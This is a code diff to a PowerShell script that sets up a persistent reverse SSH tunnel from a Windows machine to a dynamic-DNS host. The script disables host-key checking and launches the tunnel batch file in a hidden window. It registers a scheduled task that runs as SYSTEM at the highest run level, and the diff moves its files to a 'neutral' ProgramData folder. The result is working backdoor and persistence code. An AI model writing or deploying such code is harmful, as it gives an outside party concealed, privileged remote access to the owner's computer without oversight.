@@ -37,14 +37,13 @@ $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
 $receivedPort = 2004
-$logFile = "$userProfile\Other\rev_ssh.log"
-$batFilePath = "$userProfile\Other\rev_ssh.bat"
+$neutralPath = "C:\ProgramData\revssh"
+$logFile = "$neutralPath\rev_ssh.log"
+$batFilePath = "$neutralPath\rev_ssh.bat"
 
-
-# Create Other directory if not exists
-$otherDir = "$env:USERPROFILE\Other"
-if (-not (Test-Path $otherDir)) {
-    mkdir $otherDir -Force | Out-Null
+# Create C:\ProgramData\revssh if it doesn't exist
+if (-not (Test-Path $neutralPath)) {
+    New-Item -Path $neutralPath -ItemType Directory -Force | Out-Null
 }
 
 # Create SSH key pair if not exists
@@ -141,13 +140,13 @@ ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ss
 # Create the batch content with properly escaped quotes
 $batContent = @"
 @echo off
-echo [INFO] Starting reverse SSH tunnel at %date% %time% by %USERNAME% >> "$logFile"
+echo [INFO] Starting reverse SSH tunnel at %date% %time% by %%USERNAME%% >> "$logFile"
 timeout /t 10 /nobreak > nul
 "C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
-if %ERRORLEVEL% EQU 0 (
+if %%ERRORLEVEL%% EQU 0 (
     echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
 ) else (
-    echo [ERROR] SSH tunnel failed with error code %ERRORLEVEL% at %date% %time% >> "$logFile"
+    echo [ERROR] SSH tunnel failed with error code %%ERRORLEVEL%% at %date% %time% >> "$logFile"
 )
 "@
 
@@ -160,7 +159,6 @@ Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 
 
 $taskName = "ReverseSSHTunnel"
-$batFilePath = "$env:USERPROFILE\Other\rev_ssh.bat"
 
 # Remove the task if it already exists
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
@@ -180,4 +178,4 @@ Register-ScheduledTask -TaskName $taskName `
     -RunLevel Highest `
     -User "SYSTEM"
 
-#Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
+Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
